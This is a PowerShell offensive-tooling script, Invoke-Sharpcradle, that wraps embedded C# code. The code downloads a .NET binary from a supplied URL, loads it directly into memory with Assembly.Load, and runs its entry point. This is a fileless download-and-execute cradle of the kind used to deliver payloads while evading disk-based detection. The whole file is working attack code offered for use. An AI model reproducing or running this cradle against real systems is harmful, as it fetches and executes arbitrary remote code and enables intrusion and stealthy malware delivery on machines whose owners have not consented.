
function Invoke-Sharpcradle
{
<#
    .DESCRIPTION
        Download .NET Binary to RAM.
        Credits to https://github.com/anthemtotheego for Sharpcradle in C#
        Author: @securethisshit
        License: BSD 3-Clause
    #>

Param
    (
        [string]
        $uri,
	    [string]
        $argument1,
	[string]
        $argument2,
	[string]
        $argument3
)

$cradle = @"
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;


namespace SharpCradle
{
    public class Program
    {
        public static void Main(params string[] args)
        {
            
          try
          {
          
            string url = args[0];
            
                
                object[] cmd = args.Skip(1).ToArray();
                MemoryStream ms = new MemoryStream();
                using (WebClient client = new WebClient())
                {
                    //Access web and read the bytes from the binary file
                    System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
                    ms = new MemoryStream(client.DownloadData(url));
                    BinaryReader br = new BinaryReader(ms);
                    byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
                    ms.Close();
                    br.Close();
                   loadAssembly(bin, cmd);
                }
            

          }//End try
          catch
          {
            Console.WriteLine("Something went wrong! Check parameters and make sure binary uses managed code");
          }//End catch
        }//End Main  
        
        //loadAssembly
        public static void loadAssembly(byte[] bin, object[] commands)
        {
            Assembly a = Assembly.Load(bin);
            try
            {       
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);                    
                    method.Invoke(o, null);
                }
            }//End try/catch            
        }//End loadAssembly
        }


}
"@

Add-Type -TypeDefinition $cradle -Language CSharp
if ($argument1 -and $argument2 -and $argument3)
{
	[SharpCradle.Program]::Main("$uri", "$argument1", "$argument2", "$argument3")
}
elseif ($argument1 -and $argument2)
{
	[SharpCradle.Program]::Main("$uri", "$argument1", "$argument2")
}
elseif ($argument1)
{
	[SharpCradle.Program]::Main("$uri", "$argument1")
}
else
{
	[SharpCradle.Program]::Main("$uri")
}

}
